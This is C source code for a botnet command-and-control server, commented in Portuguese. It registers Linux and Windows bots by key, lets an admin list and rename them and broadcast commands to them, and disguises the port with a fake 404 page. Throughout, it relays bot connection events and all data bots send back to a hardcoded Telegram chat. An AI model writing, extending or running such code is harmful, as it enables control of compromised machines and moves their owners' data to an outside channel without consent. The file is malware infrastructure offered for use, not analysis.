#include <openssl/pem.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <stdlib.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <curl/curl.h>
#include <ctype.h>
#include <signal.h>
#define DEBUG
#define MAXCONNECTIONS 5000
typedef unsigned int SOCKET;
typedef struct bot{
    char name[30];
    SOCKET client;
    unsigned int localid;
    struct sockaddr_in addr;
    time_t init_date;
    int logged;
    int SO; //1 linux, 2 windows
    char pwd[16];
}*BOT;

_Atomic static short int SERVERSTATUS = 0;
static _Atomic unsigned int cli_count = 0;

BOT c_Bots[MAXCONNECTIONS];
pthread_mutex_t cmutex=PTHREAD_MUTEX_INITIALIZER;

int isnumeric(char str[]){
  int ok = 1;
  for(register int i = 0; i < strlen(str);++i){
    if(!isdigit(str[i]))
      ok = 0;
  }
  return ok;
}
int bot_rename(int id, char new_name[]){
  if(strlen(new_name)<=0 && strlen(new_name) >29)
    goto back;
  pthread_mutex_lock(&cmutex);
  if(c_Bots[id])
    strcpy(c_Bots[id]->name,new_name);
  pthread_mutex_unlock(&cmutex);
  goto back;
  back:
    return 0;
}
int sendall(SOCKET c,char msg[]){
  int l = strlen(msg);
  if(l <=0)
    return -1;
  char *ptr = (char *)msg;
  int i = 0;
  while (l > 0){
    if((i=send(c,ptr,l,0)) <= 0) return -1;
    ptr+=i;
    l-=i;
  }
  return 1;
}
int sndmsg(char type[],char msg[]){ //retorna o tanto de bots que foi enviado a mensagem.
  pthread_mutex_lock(&cmutex);
  int mandado = 0;
  if(!strncmp(type,"all",3)){
    for(register int i = 0,z=0; i <MAXCONNECTIONS && z < cli_count;++i){
      if(c_Bots[i] && c_Bots[i]->logged ==1){
        ++z;
        if(strlen(msg) > 1024)
          sendall(c_Bots[i]->client,msg);
        else
          send(c_Bots[i]->client,msg,strlen(msg),0);
        ++mandado;
      }
    }
  }else if(!strncmp(type,"windows",7)){
    for(register int i = 0,z=0; i <MAXCONNECTIONS && z < cli_count;++i){
      if(c_Bots[i]){
        ++z;
        if(c_Bots[i]->SO == 2){
          if(strlen(msg) > 1024)
            sendall(c_Bots[i]->client,msg);
          else
            send(c_Bots[i]->client,msg,strlen(msg),0);
          ++mandado;
        }
      }
    }
  }else if(!strncmp(type,"linux",7)){
    for(register int i = 0,z=0; i <MAXCONNECTIONS && z < cli_count;++i){
      if(c_Bots[i]){
        ++z;
        if(c_Bots[i]->SO == 1){
          if(strlen(msg) > 1024)
            sendall(c_Bots[i]->client,msg);
          else
            send(c_Bots[i]->client,msg,strlen(msg),0);
          ++mandado;
        }
      }
    }
  }else if(isnumeric(type)){
    if(c_Bots[atoi(type)]){
      if(strlen(msg) > 1024)
        sendall(c_Bots[atoi(type)]->client,msg);
      else
        send(c_Bots[atoi(type)]->client,msg,strlen(msg),0);
      ++mandado;
    }
  }
  pthread_mutex_unlock(&cmutex);
  return mandado;
}

void listbots(BOT b,int id){
  pthread_mutex_lock(&cmutex);
  char a[100]={};
  register int nn = 0;
  if(id > -1){
    if(c_Bots[id]){
      sprintf(a,"%s | %s | ID %d | %s\n",c_Bots[id]->logged == 2? "ADMIN":"BOT",inet_ntoa(c_Bots[id]->addr.sin_addr),c_Bots[id]->localid,b->SO == 1? "linux" : "windows");
      if(sendall(c_Bots[id]->client,a) < 0) goto saida;
      ++nn;
      memset(a,0,sizeof(a));
    }
  }
  for(register int i = 0,z=0; i < MAXCONNECTIONS && z <cli_count; ++i){
    if(c_Bots[i]){
      ++z;
      if(c_Bots[i]->localid == b->localid){
        sprintf(a,"%s | %s | ID %d | %s\n",c_Bots[id]->logged == 2? "ADMIN":"BOT",inet_ntoa(b->addr.sin_addr),b->localid,b->SO == 1? "linux" : "windows");
        if(sendall(b->client,a) < 0)  goto saida;
        ++nn;
        memset(a,0,sizeof(a));
      }
    }
  }
  sprintf(a,"%d Bots conectados\n%d Bots enviados\n",cli_count,nn);
  send(b->client,a,strlen(a),0);
  goto saida;
  saida:
    pthread_mutex_unlock(&cmutex);
    return;
}
void addbot(BOT b){
  pthread_mutex_lock(&cmutex);
  for(register int i = 0; i < MAXCONNECTIONS; ++i){
    if(!c_Bots[i]){
      b->localid = i;
      c_Bots[i] = b;
      ++cli_count;
      break;
    }
  }
  pthread_mutex_unlock(&cmutex);
  return;
}
void removebot(BOT b){
    pthread_mutex_lock(&cmutex);
    printf("SAINDO %s\n",inet_ntoa(b->addr.sin_addr));
    c_Bots[b->localid] =NULL;
    close(b->client);
    free(b);
    --cli_count;
    pthread_mutex_unlock(&cmutex);
}
int getpassd(char req[],BOT b){
  char chaves[]=
  "CHAVE_PARA_LINUX\n" //linux
  "CHAVE_PARA_WINDOWS\n" // windows
  "CHAVE_DE_ADMIN\n"; //adm
  char *ttt = strtok(chaves,"\n");
  while(ttt!=NULL){
    if(strstr(req,ttt) !=NULL){
      if(!strncmp(req,"CHAVE_DE_ADMIN",14)){
        b->SO = 3;
        return 2;
      }else if(!strncmp(req,"CHAVE_PARA_WINDOWS",18))
        b->SO=2;
      else
        b->SO = 1;
      return 1;
    }
    ttt=strtok(NULL,"\n");
  }
  return 0;
}
int send_telegram(char msg[]){
  if(strlen(msg) > 0 && strlen(msg) < 1000){
    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if(!curl)
      goto end;
    char *b1 = curl_easy_escape(curl,msg,strlen(msg));
    char sender[1024];
    sprintf(sender,"https://api.telegram.org/bot<APITOKEN>/sendMessage?chat_id=1259776308&text=%s",b1);
    curl_easy_setopt(curl,CURLOPT_POSTFIELDS,sender);
    curl_easy_setopt(curl,CURLOPT_POSTFIELDSIZE,(long)strlen(sender));
    curl_easy_setopt(curl,CURLOPT_HTTPGET,1L);
    curl_easy_setopt(curl,CURLOPT_URL,sender);
    curl_easy_setopt(curl,CURLOPT_VERBOSE,0L);
    CURLcode res = curl_easy_perform(curl);
    goto end;
    end:
      curl_free(b1);
      curl_easy_cleanup(curl);
      curl_global_cleanup();
      memset(sender,0,sizeof(sender));
  }
}
void killserver(){
  exit(0);
}
void *handle_connection(void *args){
    char buffer[1024] = {};
    BOT b = (BOT)args;
    printf("CONECTADO %s\n",inet_ntoa(b->addr.sin_addr));
    if(recv(b->client,buffer,sizeof(buffer),0)<0)
      goto saida;
    b->logged = getpassd(buffer,b);
    if(!b->logged){
      char http404[] = "HTTP/1.1 404 Not Found\r\nContent-Type: text/html; charset-UTF-8\r\nReferrer-Policy: no-referrer\r\nContent-Lenght: 18\r\n\r\n<h1>NOT FOUND</h1>";
      send(b->client,http404,strlen(http404),0);
      goto saida;
    }
    memset(buffer,0,sizeof(buffer));
    if(b->logged == 2){
      sprintf(buffer,"ADMIN | %s | CONECTADO",inet_ntoa(b->addr.sin_addr));
      send_telegram(buffer);
      memset(buffer,0,sizeof(buffer));
      while (recv(b->client,buffer,sizeof(buffer),0) > 0 && SERVERSTATUS){
        if(!strncmp(buffer,"listbot",7)){
          int id =0;
          int a =sscanf(buffer+8,"%d",&id);
          if(a == 0)
            id = -1;
          listbots(b,id);
        }else if(!strncmp(buffer,"rename",6)){
          int id = 0;
          char nome[30] = {};
          int a = sscanf(buffer+7,"%d %s",&id,nome); //id nome
          if(a==2)
            bot_rename(id,nome);
        }else if(!strncmp(buffer,"msg",3)){
          char msg[2044]= {},type[10]={};
          int a =sscanf(buffer+4,"%s %s",type,msg);
          if(a ==2)
            sndmsg(type,msg);
        }else if(!strncmp(buffer,"exit",4))
          goto saida;
        else if(!strncmp(buffer,"killserver",10))
          killserver();
        
        memset(buffer,0,sizeof(buffer));
      }
      goto saida;
    }
    if(b->logged == 1){
      sprintf(buffer,"BOT | IP: %s | CONEXAO RECEBIDA",inet_ntoa(b->addr.sin_addr));
      send_telegram(buffer);
      memset(buffer,0,sizeof(buffer));
      while (recv(b->client,buffer,sizeof(buffer),0) > 0 && SERVERSTATUS){
        send_telegram(buffer);
        memset(buffer,0,sizeof(buffer));
      }
    }
    goto saida;
    saida:
      printf("LOGIN: %d\n",b->logged);
      if(b->logged==1){
        sprintf(buffer,"BOT | %s | DESCONECTADO",inet_ntoa(b->addr.sin_addr));
        send_telegram(buffer);
        memset(buffer,0,sizeof(buffer));
      }else if(b->logged == 2){
        sprintf(buffer,"ADMIN | %s | DESCONECTADO",inet_ntoa(b->addr.sin_addr));
        send_telegram(buffer);
        memset(buffer,0,sizeof(buffer));
      }
      removebot(b);
      pthread_detach(pthread_self());
}
SOCKET init_server(char ip[],int port){
    #ifdef DEBUG
    printf("Iniciando BotServer\n");
    #endif
    SOCKET socket_fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(socket_fd < 0){
      #ifdef DEBUG
      perror("SOCKET");
      #endif
      return -1;
    }
    #ifdef DEBUG
    printf("Socket Criado\n");
    #endif
    struct sockaddr_in addr = {
      .sin_addr.s_addr = inet_addr(ip),
      .sin_family = AF_INET,
      .sin_port = htons(port)
    };
    #ifdef DEBUG
    printf("Estrutura addr iniciada\n");
    #endif
    int opt=1;
    if(setsockopt(socket_fd,SOL_SOCKET,(SO_REUSEADDR | SO_REUSEPORT),(char *)&opt,sizeof(opt)) <0){
      #ifdef DEBUG
      perror("SETSOCKOPT");
      #endif
      return -1;
    }
    #ifdef DEBUG
    printf("setsockopt ok!\n");
    #endif
    if(bind(socket_fd,(struct sockaddr*)&addr,sizeof(struct sockaddr)) <0){
      #ifdef DEBUG
      perror("BIND");
      #endif
      return -1;
    }
    #ifdef DEBUG
    printf("Bind Realizado com sucesso\n");
    #endif
    return socket_fd;
}
int main(int argc, char *argv[]){
    SOCKET fd = -1;
    if((fd = init_server(argv[1],atoi(argv[2]))) < 0)
      return 1;
    if(listen(fd,10) < 0){
      #ifdef DEBUG
      perror("LISTEN");
      #endif
      return 1;
    }
    SERVERSTATUS = 1;
    struct sockaddr_in caddr;
    pthread_t tid;
    while (SERVERSTATUS){
      socklen_t clen =sizeof(caddr);
      SOCKET cfd = accept(fd,(struct sockaddr*)&caddr,&clen);
      if((cli_count +1) == MAXCONNECTIONS){
        #ifdef DEBUG
        printf("max cli accepted\n");
        #endif
      }else{
        BOT b = (BOT)malloc(sizeof(struct bot));
        if(!b)
          perror("MALLOC");
        else{
          b->client=cfd;
          b->init_date=time(NULL);
          b->addr=caddr;
          addbot(b);
          pthread_create(&tid,NULL,&handle_connection,(void *)b);
        }
      }
      sleep(1);
    }
    return 0;
}
